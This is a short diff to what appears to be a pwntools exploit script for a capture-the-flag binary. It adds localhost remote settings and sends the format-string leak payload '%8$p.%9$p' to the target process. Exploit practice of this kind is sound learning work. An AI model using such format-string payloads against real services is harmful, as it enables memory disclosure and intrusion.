@@ -9,9 +9,14 @@ from pwn import *
 #context.log_level = "debug"
 
 LOCAL_BINARY = "./task"
+REMOTE_IP = "127.0.0.1"
+REMOTE_PORT = 9001
 
 p = process(LOCAL_BINARY)
+#p = remote(REMOTE_IP, REMOTE_PORT)
 #gdb.attach(p, gdbscript="")
+
+# pwn it here
 
 p.sendline(b"%8$p.%9$p")
 
